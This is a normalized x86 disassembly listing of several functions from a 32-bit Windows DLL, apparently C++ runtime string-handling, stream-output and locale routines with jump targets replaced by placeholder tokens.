push esi
call sub_100173b1
add esp 0x4
sub_10007180
push ebp
mov ebp esp
push ebx
mov ebx eax
push esi
mov esi ecx
test ebx ebx
je r-xdata
mov eax [ esi + 0x10 ]
mov edx [ ebp + 0x8 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx edx
ja r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx 0x10
jb r-xdata
test edx edx
je r-xdata
push r--data
call sub_10015cff
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push edi
lea edi [ eax + edx ]
cmp edi 0xfffffffe
jbe r-xdata
cmp ecx 0x10
jb r-xdata
cmp ebx eax
jb r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10015cff
mov eax esi
mov eax [ esi ]
jmp r-xdata
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100024e0
mov edx [ ebp + 0x8 ]
test edi edi
je r-xdata
cmp ecx 0x10
jb r-xdata
mov edx [ esi + 0x10 ]
add edx eax
cmp edx ebx
jbe r-xdata
cmp [ esi + 0x14 ] 0x10
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
mov eax esi
sub ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
call sub_10007570
pop esi
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
sub ebx eax
mov eax [ ebp + 0x8 ]
push ebx
push esi
call sub_10007570
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov eax [ esi ]
jmp r-xdata
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x4
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x4
push edx
mov edx [ esi + 0x10 ]
add edx eax
push ebx
push edx
call sub_100183c0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_100072a0
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0xc ]
push esi
mov esi ecx
mov ecx [ ebp + 0x8 ]
push edi
mov edi [ ecx + 0x10 ]
cmp edi ebx
jae r-xdata
mov eax [ ebp + 0x10 ]
sub edi ebx
cmp eax edi
jae r-xdata
push r--data
call sub_10015d4c
cmp esi ecx
jne r-xdata
mov edi eax
cmp edi 0xfffffffe
jbe r-xdata
push 0xffffffff
add edi ebx
push edi
mov ecx esi
call sub_10007660
push ebx
push 0x0
mov ecx esi
call sub_10007660
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax [ esi + 0x14 ]
cmp eax edi
jae r-xdata
push r--data
call sub_10015cff
test edi edi
jne r-xdata
mov eax [ esi + 0x10 ]
push eax
push edi
mov ecx esi
call sub_100024e0
mov ecx [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp eax 0x10
jb r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
pop edi
mov eax esi
pop esi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0xc
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn 0xc
push edi
add ecx ebx
push ecx
push eax
call sub_100183c0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10007390
push ebp
mov ebp esp
sub esp 0x10
push esi
xor esi esi
push edi
mov edi eax
mov eax [ ebp + 0xc ]
cmp [ ebp + 0x18 ] esi
jbe r-xdata
mov ecx [ ebp + 0x14 ]
mov edx [ ebp + 0x10 ]
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ebp + 0x8 ]
add eax 0x8
mov [ ebp - 0xc ] eax
push ebx
mov [ ebp + 0x10 ] 0x1
mov ebx [ ecx + 0x24 ]
cmp [ ebx ] 0x0
mov esi [ ebp - 0x8 ]
lea eax [ ecx + 0x24 ]
movzx edx si
je r-xdata
mov edx [ ebp - 0xc ]
mov cl [ edi ]
push edx
lea eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x4 ] cl
push 0x1
lea ecx [ ebp - 0x4 ]
push ecx
lea edx [ ebp - 0x8 ]
push edx
mov [ ebp - 0x8 ] esi
mov [ ebp - 0x10 ] esi
call sub_10016639
mov ecx [ ebp + 0x14 ]
add esp 0x14
cmp ecx esi
je r-xdata
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x10 ]
pop ebx
pop edi
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
pop esi
mov esp ebp
pop ebp
retn
mov eax [ ecx ]
mov edx [ eax + 0xc ]
push esi
call edx
movzx eax ax
mov ebx [ ecx + 0x34 ]
cmp [ ebx ] 0x0
jle r-xdata
mov eax [ ebp + 0x18 ]
dec eax
xor esi esi
inc edi
mov [ ebp + 0x18 ] eax
cmp eax esi
ja r-xdata
mov ecx ebx
dec [ ecx ]
mov eax [ eax ]
mov ecx [ eax ]
lea esi [ ecx + 0x2 ]
mov [ eax ] esi
mov [ ecx ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
mov ecx [ ebp + 0x14 ]
jne r-xdata
sub_10007460
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov edi eax
lea ebx [ ebx ]
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x14 ]
push esi
push eax
mov eax [ ebp + 0x8 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
push eax
mov eax edi
call sub_10007390
mov ecx [ eax ]
mov [ ebp + 0x14 ] ecx
mov edx [ eax + 0x4 ]
add esp 0x14
add edi esi
sub [ ebp + 0x10 ] esi
mov [ ebp + 0x18 ] edx
je r-xdata
sub eax edi
mov esi eax
mov edx [ eax ]
mov ecx [ ebp + 0xc ]
mov eax [ eax + 0x4 ]
pop edi
mov [ ecx + 0x4 ] eax
mov [ ecx ] edx
mov eax ecx
pop esi
mov esp ebp
pop ebp
retn
test bx bx
je r-xdata
inc edi
dec [ ebp + 0x10 ]
jmp r-xdata
mov esi [ eax + 0x4 ]
mov ecx [ eax ]
mov [ ebp - 0xc ] ecx
test esi esi
je r-xdata
mov esi [ ebp + 0x10 ]
push esi
push 0x0
push edi
call sub_100175c0
add esp 0xc
test eax eax
je r-xdata
mov [ ebp - 0xc ] 0x1
mov edx [ esi + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
mov eax [ esi ]
mov edx [ eax + 0xc ]
push ebx
mov ecx esi
call edx
movzx eax ax
mov eax [ esi + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov edx [ ebp - 0xc ]
mov [ ebp + 0x14 ] edx
mov [ ebp + 0x18 ] esi
dec [ eax ]
mov eax [ esi + 0x24 ]
mov ecx [ eax ]
lea edx [ ecx + 0x2 ]
mov [ eax ] edx
mov [ ecx ] bx
movzx eax bx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_10007570
push ebp
mov ebp esp
mov edx [ ebp + 0xc ]
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
cmp eax edx
jae r-xdata
sub eax edx
cmp eax ebx
jae r-xdata
push r--data
call sub_10015d4c
mov eax [ esi + 0x10 ]
or ecx 0xffffffff
sub ecx eax
cmp ecx ebx
ja r-xdata
mov ebx eax
test ebx ebx
je r-xdata
push r--data
call sub_10015cff
mov eax esi
pop ebx
pop ebp
retn 0x8
push edi
lea edi [ eax + ebx ]
cmp edi 0xfffffffe
jbe r-xdata
mov ecx [ esi + 0x14 ]
cmp ecx edi
jae r-xdata
push r--data
call sub_10015cff
test edi edi
jne r-xdata
push eax
push edi
mov ecx esi
call sub_100024e0
mov edx [ ebp + 0xc ]
test edi edi
je r-xdata
mov ecx [ ebp + 0x8 ]
mov eax 0x10
cmp [ ecx + 0x14 ] eax
jb r-xdata
mov [ esi + 0x10 ] edi
cmp ecx 0x10
jb r-xdata
pop edi
cmp [ esi + 0x14 ] eax
jb r-xdata
mov ecx [ ecx ]
mov eax esi
pop edi
mov [ eax ] 0x0
pop ebx
pop ebp
retn 0x8
mov eax [ esi ]
pop edi
mov [ eax ] 0x0
mov eax esi
pop ebx
pop ebp
retn 0x8
mov eax esi
mov eax [ esi ]
jmp r-xdata
mov eax esi
mov [ eax + edi ] 0x0
mov eax [ esi ]
mov [ eax + edi ] 0x0
pop edi
mov eax esi
pop ebx
pop ebp
retn 0x8
add ecx edx
mov edx [ esi + 0x10 ]
push ebx
push ecx
add edx eax
push edx
call sub_100183c0
add esp 0xc
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] edi
jb r-xdata
sub_10007660
push ebp
mov ebp esp
push esi
mov esi ecx
mov eax [ esi + 0x10 ]
mov ecx [ ebp + 0x8 ]
push edi
cmp eax ecx
jae r-xdata
mov edi [ ebp + 0xc ]
sub eax ecx
cmp eax edi
jae r-xdata
push r--data
call sub_10015d4c
test edi edi
je r-xdata
mov edi eax
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
mov edx [ esi + 0x14 ]
push ebx
cmp edx 0x10
jb r-xdata
mov ebx esi
mov ebx [ esi ]
jmp r-xdata
mov edx esi
mov edx [ esi ]
jmp r-xdata
cmp edx 0x10
jb r-xdata
mov ecx esi
mov [ ecx + eax ] 0x0
mov ecx [ esi ]
mov [ ecx + eax ] 0x0
pop edi
mov eax esi
pop esi
pop ebp
retn 0x8
sub eax edi
add ebx ecx
push eax
add ebx edi
add edx ecx
push ebx
push edx
call sub_10017050
mov eax [ esi + 0x10 ]
add esp 0xc
sub eax edi
cmp [ esi + 0x14 ] 0x10
mov [ esi + 0x10 ] eax
pop ebx
jb r-xdata
sub_100076f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028efa
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ ebp + 0xc ]
xor edi edi
mov [ ebp - 0x14 ] edi
lea edx [ eax + 0x2 ]
lea esp [ esp ]
mov cx [ eax ]
add eax 0x2
cmp cx di
jne r-xdata
sub eax edx
sar eax 0x1
mov [ ebp - 0x18 ] eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
mov ecx [ edx + esi + 0x24 ]
mov eax [ edx + esi + 0x20 ]
test ecx ecx
jl r-xdata
xor ebx ebx
mov [ ebp - 0x1c ] ebx
jg r-xdata
mov [ ebp - 0x4 ] 0x0
mov eax [ esi ]
mov eax [ eax + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov eax [ edx ]
mov ecx edx
mov edx [ eax + 0x4 ]
call edx
cmp ecx edi
jl r-xdata
test eax eax
je r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
sete cl
mov [ ebp - 0x24 ] cl
mov [ ebp - 0x4 ] 0x1
test cl cl
jne r-xdata
mov eax [ eax + esi + 0x3c ]
test eax eax
je r-xdata
jg r-xdata
mov [ ebp - 0x4 ] 0x2
mov eax [ eax + esi + 0x14 ]
and eax 0x1c0
cmp eax 0x40
je r-xdata
mov edx 0x4
jmp r-xdata
mov ecx eax
call sub_10003920
sub eax [ ebp - 0x18 ]
sbb ecx edi
mov ebx eax
mov [ ebp - 0x1c ] ecx
jmp r-xdata
cmp eax [ ebp - 0x18 ]
jbe r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov eax [ ebp - 0x18 ]
mov edx [ ecx ]
mov edx [ edx + 0x24 ]
xor edi edi
push edi
push eax
mov eax [ ebp + 0xc ]
push eax
call edx
cmp eax [ ebp - 0x18 ]
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test edx edx
je r-xdata
mov edx [ edx + esi + 0x38 ]
mov [ ebp - 0x28 ] esi
test edx edx
je r-xdata
mov [ ebp - 0x14 ] 0x4
cmp edx edi
je r-xdata
cmp [ ebp - 0x14 ] 0x0
jne r-xdata
jg r-xdata
mov [ ebp - 0x4 ] 0x4
call j_sub_1001a4cd
mov edi [ ebp - 0x28 ]
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax edx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
cmp [ ebp - 0x1c ] 0x0
jl r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov [ ebp - 0x4 ] 0x1
mov edx [ ebp - 0x14 ]
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ebx ebx
je r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
jg r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ esi ]
mov eax [ eax + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test ebx ebx
je r-xdata
add ebx 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
or [ ebp - 0x14 ] 0x4
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
add ebx 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
or [ ebp - 0x14 ] 0x4
jmp r-xdata
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edi [ eax + 0x2 ]
mov [ ecx ] edi
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_1000796c
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_100079b0
test esi esi
jne r-xdata
mov edx [ ecx + 0xc ]
mov eax [ esi ]
mov eax [ eax + 0x4 ]
push edx
mov edx [ ecx + 0x8 ]
add eax esi
push edx
push eax
mov eax [ ecx ]
call eax
add esp 0xc
mov eax esi
retn
mov edx [ ecx + 0xc ]
push edx
mov edx [ ecx + 0x8 ]
xor eax eax
push edx
push eax
mov eax [ ecx ]
call eax
add esp 0xc
mov eax esi
retn
sub_100079f0
push ebp
mov ebp esp
push 0xffffffff
push sub_10028eba
mov eax [ fs : 0x0 ]
push eax
sub esp 0x1c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
mov eax [ esi ]
mov ecx [ eax + 0x4 ]
mov ecx [ ecx + esi + 0x38 ]
xor ebx ebx
mov edi esi
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x28 ] edi
test ecx ecx
je r-xdata
mov [ ebp - 0x4 ] 0x0
mov ecx [ esi ]
mov eax [ ecx + 0x4 ]
cmp [ eax + esi + 0xc ] 0x0
jne r-xdata
mov edx [ ecx ]
mov eax [ edx + 0x4 ]
call eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
add edx esi
cmp [ edx + 0xc ] 0x0
sete al
mov [ ebp - 0x24 ] al
mov [ ebp - 0x4 ] 0x1
test al al
je r-xdata
mov eax [ eax + esi + 0x3c ]
test eax eax
je r-xdata
mov eax [ esi ]
mov eax [ eax + 0x4 ]
xor ecx ecx
mov [ eax + esi + 0x20 ] ecx
mov [ eax + esi + 0x24 ] ecx
mov ecx [ esi ]
mov ecx [ ecx + 0x4 ]
add ecx esi
test ebx ebx
je r-xdata
mov ecx [ edx + 0x24 ]
mov eax [ edx + 0x20 ]
test ecx ecx
jg r-xdata
mov ecx eax
call sub_10003920
mov [ ebp - 0x4 ] 0x4
call j_sub_1001a4cd
test al al
jne r-xdata
mov eax [ ecx + 0xc ]
or eax ebx
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
sub eax 0x1
sbb ecx 0x0
mov edi eax
mov [ ebp - 0x1c ] ecx
jl r-xdata
mov [ ebp - 0x4 ] 0xffffffff
mov edx [ edi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + edi + 0x38 ]
test ecx ecx
je r-xdata
mov ecx edi
call sub_100064f0
push 0x0
call sub_100033b0
or eax 0x4
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
mov edx [ ecx + 0x24 ]
cmp [ edx ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
xor edi edi
mov [ ebp - 0x1c ] edi
jmp r-xdata
cmp eax 0x1
ja r-xdata
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ecx ]
mov eax [ edx + 0x8 ]
call eax
mov eax [ ecx ]
mov edx [ ebp + 0xc ]
mov eax [ eax + 0xc ]
push edx
call eax
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov [ ebp - 0x4 ] 0x1
mov edi [ ebp - 0x28 ]
cmp [ ebp - 0x1c ] ebx
jl r-xdata
mov [ ebp - 0x4 ] 0x2
mov edx [ edx + 0x14 ]
and edx 0x1c0
cmp edx 0x40
je r-xdata
test ebx ebx
jne r-xdata
mov ebx 0x4
mov [ ebp - 0x14 ] ebx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea edx [ eax + 0x2 ]
mov [ ecx ] edx
mov ecx [ ebp + 0xc ]
mov [ eax ] cx
movzx eax cx
jmp r-xdata
jg r-xdata
cmp [ ebp - 0x1c ] ebx
jl r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
jg r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov edx [ esi ]
mov eax [ edx + 0x4 ]
mov ecx [ eax + esi + 0x38 ]
movzx edx [ eax + esi + 0x40 ]
mov eax [ ecx + 0x24 ]
cmp [ eax ] 0x0
je r-xdata
test edi edi
je r-xdata
add edi 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov ebx 0x4
mov [ ebp - 0x14 ] ebx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x14 ]
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov eax [ ecx ]
push edx
mov edx [ eax + 0xc ]
call edx
movzx eax ax
mov eax [ ecx + 0x34 ]
cmp [ eax ] 0x0
jle r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
add edi 0xffffffff
adc [ ebp - 0x1c ] 0xffffffff
jmp r-xdata
mov ebx 0x4
mov [ ebp - 0x14 ] ebx
dec [ eax ]
mov ecx [ ecx + 0x24 ]
mov eax [ ecx ]
lea ebx [ eax + 0x2 ]
mov [ ecx ] ebx
mov ebx [ ebp - 0x14 ]
mov [ eax ] dx
mov eax edx
jmp r-xdata
mov ecx 0xffff
cmp cx ax
jne r-xdata
sub_10007be5
mov eax [ ebp + 0x8 ]
mov edx [ eax ]
mov ecx [ edx + 0x4 ]
add ecx eax
mov eax [ ecx + 0xc ]
or eax 0x4
cmp [ ecx + 0x38 ] 0x0
jne r-xdata
push 0x1
call sub_100033b0
mov [ ebp - 0x4 ] 0x1
mov eax r-xdata
retn
or eax 0x4
sub_10007ca0
push ebp
mov ebp esp
push 0xffffffff
push sub_100285b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_100163b9
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100163b9
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_100163e1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001608f
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100163e1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10007f20
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_100163b9
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10016fc1
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10017df7
lea ecx [ ebp - 0x14 ]
call sub_100163e1
push esi
call sub_10016018
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10007de0
push ebp
mov ebp esp
push 0xffffffff
push sub_100285b8
mov eax [ fs : 0x0 ]
push eax
sub esp 0x18
push ebx
push esi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x0
lea ecx [ ebp - 0x18 ]
call sub_100163b9
mov [ ebp - 0x4 ] 0x0
cmp [ rw-data ] 0x0
mov ebx [ rw-data ]
mov [ ebp - 0x10 ] ebx
jne r-xdata
mov esi [ rw-data ]
mov eax [ edi ]
cmp esi [ eax + 0xc ]
jae r-xdata
push 0x0
lea ecx [ ebp - 0x14 ]
call sub_100163b9
cmp [ rw-data ] 0x0
jne r-xdata
xor ecx ecx
jmp r-xdata
mov ecx [ eax + 0x8 ]
mov ecx [ ecx + esi * 4 ]
test ecx ecx
jne r-xdata
lea ecx [ ebp - 0x14 ]
call sub_100163e1
mov eax [ rw-data ]
inc eax
mov [ rw-data ] eax
mov [ rw-data ] eax
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov esi ecx
call sub_1001608f
cmp esi [ eax + 0xc ]
jae r-xdata
lea ecx [ ebp - 0x18 ]
mov [ ebp - 0x4 ] 0xffffffff
call sub_100163e1
mov eax esi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test ebx ebx
je r-xdata
mov edx [ eax + 0x8 ]
mov esi [ edx + esi * 4 ]
jmp r-xdata
lea eax [ ebp - 0x10 ]
push edi
push eax
call sub_10007fe0
add esp 0x8
cmp eax 0xffffffff
jne r-xdata
mov esi ebx
jmp r-xdata
test esi esi
jne r-xdata
mov esi [ ebp - 0x10 ]
push 0x0
lea ecx [ ebp - 0x14 ]
mov [ rw-data ] esi
call sub_100163b9
mov eax [ esi + 0x4 ]
cmp eax 0xffffffff
jae r-xdata
push r--data
lea ecx [ ebp - 0x24 ]
call sub_10016fc1
push r--data
lea ecx [ ebp - 0x24 ]
push ecx
call sub_10017df7
lea ecx [ ebp - 0x14 ]
call sub_100163e1
push esi
call sub_10016018
add esp 0x4
inc eax
mov [ esi + 0x4 ] eax
sub_10007f20
push ebp
mov ebp esp
push 0xffffffff
push sub_1002858b
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi ] ebx
jne r-xdata
push 0x10
call sub_1001740d
mov esi eax
add esp 0x4
mov [ ebp - 0x10 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov edi [ eax + 0x18 ]
cmp edi ebx
jne r-xdata
lea edx [ ebp - 0x34 ]
push edx
call sub_10002d70
lea ecx [ ebp - 0x34 ]
push ecx
call sub_10002cd0
mov ebx 0x1
mov [ esi + 0x4 ] 0x0
mov [ esi ] r--data
call sub_10015e4c
mov edi [ ebp + 0x8 ]
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] edx
jmp r-xdata
lea edi [ eax + 0x1c ]
mov [ ebp - 0x4 ] 0xffffffff
mov [ edi ] esi
test bl 0x1
je r-xdata
sub_10007fe0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002855d
mov eax [ fs : 0x0 ]
push eax
sub esp 0x2c
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ ebp + 0x8 ]
xor ebx ebx
mov [ ebp - 0x10 ] ebx
cmp edi ebx
je r-xdata
mov eax 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ edi ] ebx
jne r-xdata
push 0x18
call sub_1001740d
mov esi eax
add esp 0x4
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x4 ] ebx
cmp esi ebx
je r-xdata
xor esi esi
mov eax [ ebp + 0xc ]
mov eax [ eax ]
mov ecx [ eax + 0x18 ]
cmp ecx ebx
jne r-xdata
lea eax [ ebp - 0x38 ]
push eax
call sub_10002d70
lea edx [ ebp - 0x38 ]
push edx
mov edi ecx
call sub_10002cd0
mov ebx 0x1
mov [ ebp - 0x10 ] ebx
mov [ esi + 0x4 ] 0x0
mov [ ebp - 0x4 ] 0x2
push esi
mov [ esi ] r--data
call sub_100080a0
mov edi [ ebp + 0x8 ]
jmp r-xdata
lea ecx [ eax + 0x1c ]
mov [ edi ] esi
mov [ ebp - 0x4 ] 0xffffffff
test bl 0x1
je r-xdata
sub_100080a0
push ebp
mov ebp esp
push 0xffffffff
push sub_100284c0
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov [ ebp - 0x10 ] esp
mov esi [ ebp + 0x8 ]
call sub_1001766d
xor ebx ebx
mov [ ebp - 0x20 ] eax
mov [ esi + 0x8 ] ebx
mov [ esi + 0x10 ] ebx
mov [ esi + 0x14 ] ebx
mov [ ebp - 0x4 ] ebx
mov edi r--data
call sub_10015e4c
push 0x1
mov [ ebp - 0x18 ] 0x1
call sub_10015dba
add esp 0x4
mov ecx eax
mov [ esi + 0x8 ] eax
call sub_10015e4c
